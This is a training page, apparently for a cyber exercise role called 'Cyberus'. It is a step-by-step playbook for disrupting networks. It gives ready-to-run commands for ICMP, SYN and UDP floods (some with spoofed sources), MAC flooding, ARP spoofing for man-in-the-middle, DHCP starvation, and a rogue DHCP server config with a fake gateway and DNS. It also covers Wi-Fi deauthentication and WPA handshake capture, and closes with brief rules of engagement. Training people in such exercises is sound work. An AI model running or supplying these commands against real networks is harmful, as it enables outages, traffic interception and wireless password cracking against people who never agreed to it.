---
layout: default
title: Cyberus
---

# Cyberus    

**Focus**: Network denial and disruption  
**Skill**: Disconnect or degrade hostile systems  
**Activity**: Identify attackers and remove them from the network  

<div style="text-align: center;">
  <img src="{{ 'classes/cyberus/images/cyberus1.png' | relative_url }}" alt="Cyberus Logo" style="max-width: 80%; height: auto;">
</div>

---

# Denial of Service

## ICMP Flood

Install tool (if needed):
#### `sudo apt install -y hping3`

Fast ping flood:
#### `sudo ping -f <target_ip>`

Large packet flood:
#### `sudo ping -f -s 65000 <target_ip>`

Using hping3:
#### `sudo hping3 --flood --icmp <target_ip>`

**Flag Notes**
- `-f` → sends packets as fast as possible  
- `-s` → changes packet size  
- `--icmp` → chooses ICMP protocol  
- `--flood` → removes delay between packets  

Try changing:
- packet size  
- protocol  
- target  

---

## SYN Flood

Flood a service port (example: SSH):
#### `sudo hping3 -S --flood -p 22 <target_ip>`

More aggressive:
#### `sudo hping3 -S --flood --rand-source -p 22 <target_ip>`

**Flag Notes**
- `-S` → sends SYN packets (start of TCP connection)  
- `-p` → chooses port  
- `--rand-source` → spoofs source IP  
- `--flood` → sends continuously  

Try changing:
- port number  
- adding or removing spoofing  

---

## UDP Flood

Flood a UDP port:
#### `sudo hping3 --flood --udp -p 53 <target_ip>`

**Flag Notes**
- `--udp` → uses UDP protocol  
- `-p` → target port  
- `--flood` → continuous send  

Try changing:
- ports commonly used by services  

---

## MAC Flood (Switch exhaustion)

Install tool:
#### `sudo apt install -y dsniff`

Run:
#### `sudo macof -i <interface>`

**Flag Notes**
- `-i` → selects network interface  
- Tool generates large numbers of fake MAC addresses  

Try changing:
- interface  

---

# ARP

## ARP Spoofing (Disconnect victim from gateway)

Install tools:
#### `sudo apt install -y dsniff ettercap bettercap`

Find gateway:
#### `ip r`

Terminal 1:
#### `sudo arpspoof -i <interface> -t <target_ip> <gateway_ip>`

Terminal 2:
#### `sudo arpspoof -i <interface> -t <gateway_ip> <target_ip>`

**Flag Notes**
- `-i` → interface used  
- `-t` → target being poisoned  
- Last IP → system you are impersonating  

What is happening:
1. Tell victim you are gateway  
2. Tell gateway you are victim  
3. Traffic flows through attacker  

---

## Ettercap ARP Poisoning (GUI)

Start:
#### `sudo ettercap -G`

Steps:
1. Select interface  
2. Scan for hosts  
3. Add target 1 = victim  
4. Add target 2 = gateway  
5. MitM → ARP poisoning → Start  

**What this does**
- Automates the same steps as arpspoof  
- Adds packet inspection capability  

---

## Gratuitous ARP Flood

Using nemesis:
#### `sudo apt install -y nemesis`
#### `sudo nemesis arp -v -d <target_ip> -S <fake_ip> -h <fake_mac>`

**Flag Notes**
- `-d` → destination  
- `-S` → spoofed sender IP  
- `-h` → spoofed MAC  
- `-v` → verbose output  

Try changing:
- spoofed values  

---

# DHCP

## DHCP Starvation (Consume leases)

Install tool:
#### `sudo apt install -y yersinia`

Run interactive mode:
#### `sudo yersinia -G`

Steps:
1. Select DHCP
2. Launch starvation attack

**What is happening**
- Many fake clients request addresses  
- Pool runs out  
- Real clients cannot obtain IP  

---

## Rogue DHCP Server (dnsmasq)

Install:
#### `sudo apt install -y dnsmasq`

Example minimal config:
Edit:
#### `sudo nano /etc/dnsmasq.conf`

Add:
```
interface=<interface>
dhcp-range=192.168.1.50,192.168.1.150,12h
dhcp-option=3,<fake_gateway_ip>
dhcp-option=6,<fake_dns_ip>
```


Restart:
#### `sudo systemctl restart dnsmasq`

**What the options mean**
- `dhcp-range` → addresses handed out  
- `option 3` → gateway given to clients  
- `option 6` → DNS server given to clients  

---

# Deauthentication

## Monitor wireless interfaces

#### `iwconfig`

Enable monitor mode:
#### `sudo airmon-ng start wlan0`

**What this does**
- Puts adapter into packet capture mode  

---

## Find targets

#### `sudo airodump-ng wlan0mon`

Record:
- BSSID
- Channel
- Client MAC

**What to look for**
- Which AP is active  
- Which clients are connected  

---

## Deauth a client

#### `sudo aireplay-ng --deauth 20 -a <bssid> -c <client_mac> wlan0mon`

Deauth entire AP:
#### `sudo aireplay-ng --deauth 50 -a <bssid> wlan0mon`

**Flag Notes**
- `--deauth` → number of packets sent  
- `-a` → access point  
- `-c` → client  

Try changing:
- packet count  

---

## Alternative: mdk4

Install:
#### `sudo apt install -y mdk4`

Run:
#### `sudo mdk4 wlan0mon d -B <bssid>`

**Flag Notes**
- `d` → deauth mode  
- `-B` → target AP  

---

# Deauth && Handshake Capture

## Capture handshake

Start capture:
#### `sudo airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon`

Leave running.

**Flag Notes**
- `-c` → channel  
- `--bssid` → target AP  
- `-w` → output file  

---

## Force reconnect to capture handshake

#### `sudo aireplay-ng --deauth 10 -a <bssid> wlan0mon`

Watch for:
WPA handshake: <bssid>

---

## Verify capture

Files created:
```
capture.cap
capture.csv
```

Open:
#### `wireshark capture.cap`

**What you are verifying**
- Handshake packets present  
- Correct network  

---

# Quick Recon Commands

Find interface:
#### `ip addr`

Find gateway:
#### `ip r`

Find active traffic:
#### `sudo iftop -i <interface>`

Watch packets:
#### `sudo tcpdump -i <interface>`

**What these tell you**
- Interfaces  
- Routes  
- Traffic patterns  
- Packet details  

---

# Rules of Engagement

- Only attack assigned targets  
- Stop attacks when instructed  
- Restore systems after exercise  

---
